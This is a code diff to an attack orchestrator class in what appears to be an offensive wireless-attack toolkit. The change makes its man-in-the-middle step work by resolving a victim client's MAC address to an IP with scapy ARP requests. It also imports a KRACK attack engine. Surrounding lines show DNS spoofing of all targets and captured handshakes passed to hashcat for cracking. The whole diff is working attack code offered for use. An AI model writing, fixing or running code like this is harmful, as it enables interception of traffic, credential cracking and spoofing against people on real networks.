@@ -444,11 +444,32 @@ class AttackOrchestrator:
         # Start MITM for traffic interception
         if close_clients:
             self.mitm_engine = MITMEngine(self.monitor_iface)
-            # MITM on the first close client as example
-            sample_client = list(close_clients)[0] if close_clients else None
-            if sample_client:
-                self.mitm_engine.start(target_ip=sample_client)
-                log.info(f"MITM attack started against {sample_client}")
+            # MITM requires an IP address, not a MAC. Attempt ARP resolution
+            # on the first close client to get its IP address.
+            sample_client_mac = list(close_clients)[0] if close_clients else None
+            sample_client_ip = None
+            if sample_client_mac:
+                try:
+                    from scapy.all import srp, Ether, ARP
+                    # ARP who-has on the local subnet to resolve MAC -> IP
+                    # This works when we're on the same L2 segment as the client
+                    ans, _ = srp(
+                        Ether(dst=sample_client_mac) / ARP(pdst="10.0.0.0/24"),
+                        iface=self.ap_iface, timeout=2, verbose=False
+                    )
+                    for _, rcv in ans:
+                        if rcv.haslayer(ARP) and rcv[ARP].hwsrc.lower() == sample_client_mac.lower():
+                            sample_client_ip = rcv[ARP].psrc
+                            break
+                except Exception as e:
+                    log.debug(f"ARP resolution for MITM target failed: {e}")
+
+            if sample_client_ip:
+                self.mitm_engine.start(target_ip=sample_client_ip)
+                log.info(f"MITM attack started against {sample_client_ip} ({sample_client_mac})")
+            else:
+                log.warning(f"MITM skipped: could not resolve IP for client {sample_client_mac}")
+                self.mitm_engine = None
 
         # Start DNS spoofing for all targets
         self.dns_spoof = DNSSpoofEngine(self.monitor_iface)
@@ -574,6 +595,7 @@ class AttackOrchestrator:
                                 log.info(f"Auto-feeding handshake to hashcat: {pcap_file}")
                             # Trigger KRACK if enabled
                             if self.enable_krack and not self.krack_engine:
+                                from .krack import KRACKEngine
                                 self.krack_engine = KRACKEngine(
                                     self.monitor_iface, client_mac, bssid)
                                 self.krack_engine.start()
